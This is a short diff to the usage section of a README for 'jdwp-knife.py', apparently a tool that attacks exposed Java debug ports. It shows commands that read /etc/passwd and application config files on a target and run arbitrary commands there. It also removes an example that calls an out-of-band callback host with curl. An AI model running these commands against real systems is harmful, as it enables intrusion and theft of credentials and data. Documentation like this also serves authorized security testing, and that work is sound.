@@ -26,7 +26,7 @@ python3 jdwp-knife.py -t <target ip> -p 5005 --ls /app
 python3 jdwp-knife.py -t <target ip> -p 5005 --cat /etc/passwd
 
 # Command execution, it can write the stdout to the console (no need to exfiltrate data)
-python3 jdwp-knife.py -t <target ip> -p 5005 --cmd "curl http://collaborator.oastify.com"
+python3 jdwp-knife.py -t <target ip> -p 5005 --cmd "id"
 
 # Combine multiple operations
 python3 jdwp-knife.py -t <target ip> -p 5005 --env --ls /app --cat /app/application.yml
